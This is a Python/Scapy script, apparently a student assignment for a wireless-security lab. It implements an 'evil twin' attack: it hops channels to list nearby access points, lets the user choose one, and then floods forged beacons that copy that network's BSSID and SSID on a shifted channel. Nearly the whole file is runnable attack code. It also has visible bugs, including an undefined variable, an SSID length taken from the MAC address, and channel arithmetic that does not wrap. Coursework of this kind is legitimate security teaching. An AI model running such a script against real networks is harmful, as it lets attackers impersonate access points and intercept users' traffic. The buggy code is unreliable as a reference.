#!/usr/bin/env python3

"""
SWI laboratory - script n°2 - Evil twin

Author: Rébecca Tevaearai, Rosy-Laure Wonjamouna

Created: 26th March, 2022

1. Dresse une liste des SSID disponibles à proximité.
2. Présente à l'utilisateur la liste, avec les numéros de canaux
   et les puissances.
3. Permet à l'utilisateur de choisir le réseau à attaquer.
4. Génére un beacon concurrent annonçant un réseau sur un canal
   différent se trouvant à 6 canaux de séparation du réseau
   original

"""

from scapy.all import *
from argparse import ArgumentParser as AP
import threading
import os, time
import random
from threading import *


ap_list = []
start_hopper = True

def scan(pkt):
    """
    Scan to discover AP
    """
    if pkt.haslayer(Dot11Beacon):
        stats = pkt[Dot11Beacon].network_stats() # to get the channel of the packet
        channel = stats.get("channel") 
        if [pkt.addr2, pkt.info, channel] not in ap_list:
            
            try:
                dbm_signal = packet.dbm_signal
            except:
                dbm_signal = "N/A"
            
            print("Index:", len(ap_list), "  AP:", pkt.addr2, "  Channel:", channel, "  SSID:", pkt.info.decode())
            ap_list.append([pkt.addr2, pkt.info, channel])


def showAPs():
    sniff(iface=args.interface, prn=scan,timeout=10)
    if len(ap_list) == 0:
        print('No SSID found')
        exit(0)


def hopper(interface):
    """
    Channel hopper
    """
    while start_hopper:
        channel = random.randrange(1, 12)
        os.system("iwconfig %s channel %d" % (interface, channel))
        time.sleep(0.5)


def setChannel(interface, channel): 
      os.system('iwconfig %s channel %d' % (interface, channel))   


def evil_twin(channel, target_mac, target_ssid, interface):
    """
    Function that create a fake twin of an AP by sending beacon packet 
    with the same BSSID and SSID but on a different channel. 
    """
    setChannel(interface, channel)

    dot11 = Dot11(type = 0, subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = target_mac, addr3 = target_mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID = 'SSID', info = target_ssid, len = len(target_mac))
    dsset = Dot11Elt(ID="DSset", info=chr(channel))
    packet = RadioTap()/dot11/beacon/essid/dsset
    sendp(packet, inter = 0.1, iface = args.interface, loop = 1, verbose = 0)    


if __name__ == '__main__':
    parser = AP(description = "Fake channel evil twin attack")
    parser.add_argument("-i", "--interface", required = True, help = "the interface name")
    args = parser.parse_args()

    # start the channel hopper to discover more packet
    thread = threading.Thread(target=hopper, args=(args.interface, ), name="hopper")
    thread.start()

    showAPs()
    
    start_hopper = False # stop the channel hopper

    index = int(input("\nChoose an SSID to attack (enter index): "))
    
    target_mac, target_ssid, channel = ap_list[index]
    if channel == None:
        channel = 1
    fake_channel = channel + 6 % 12 # 6 channel away from the original one

    evil_twin(fake_channel, target_mac, target_ssid, args.interface)
    
